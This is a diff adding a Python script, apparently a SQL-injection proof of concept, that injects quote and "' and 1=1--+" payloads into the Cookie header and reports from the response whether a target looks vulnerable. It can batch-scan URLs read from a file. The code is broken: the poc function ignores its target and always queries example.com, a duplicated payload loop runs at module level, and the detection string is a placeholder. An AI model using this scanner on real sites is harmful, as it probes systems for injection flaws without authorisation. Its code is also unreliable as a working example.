@@ -1,0 +1,59 @@
+#!/usr/bin/python3
+#-*- coding:utf-8 -*-
+import argparse,sys,requests,time,os,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def poc(target):
+    headers={
+    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+}
+    list = ["'", "' and 1=1--+"]
+    for payload in list:
+        header = {'User-Agent':
+                      'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
+                  'Cookie': '' + payload + '; session='}
+        url = 'http://www.example.com'
+        url = requests.get('http://www.example.com', headers=header)
+        url.encoding = "utf-8"
+        html = url.text
+        print('payload=', payload)
+        if "目标字符串" in url.text:
+            print("正常")
+        else:
+            print("有问题")
+
+list = ["'", "' and 1=1--+"]
+for payload in list:
+   header={'User-Agent':
+      'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
+      'Cookie': '' + payload + '; session='}
+   url = 'http://www.example.com'
+   url = requests.get('http://www.example.com',headers=header)
+   url.encoding = "utf-8"
+   html=url.text
+   print('payload=',payload)
+   if "目标字符串" in url.text:
+      print("正常")
+   else:
+      print("有问题")
+
+def main():
+    parser = argparse.ArgumentParser(description='sql注入')
+    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
+    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        for j in url_list:
+            poc(j)
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+if __name__ == "__main__":
+    main()
